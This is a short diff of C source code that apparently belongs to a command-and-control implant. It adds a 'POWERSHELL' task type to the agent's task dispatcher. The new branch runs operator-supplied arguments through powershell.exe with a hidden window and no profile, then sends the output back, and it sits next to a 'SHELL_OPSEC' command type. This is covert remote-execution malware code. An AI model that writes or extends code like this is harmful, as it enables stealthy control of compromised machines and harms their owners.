@@ -2501,6 +2501,14 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id, out, "");
         free(out);
     }
+    else if (strcmp(type_upper, "POWERSHELL") == 0) {
+        char ps_cmd[4096];
+        snprintf(ps_cmd, sizeof(ps_cmd),
+            "powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden -Command \"%s\" 2>&1", args);
+        char *out = run_shell(ps_cmd);
+        agent_send_result(task->id, out, "");
+        free(out);
+    }
     else if (strcmp(type_upper, "SHELL_OPSEC") == 0) {
         char *out = run_shell_opsec(args);
         agent_send_result(task->id, out, "");
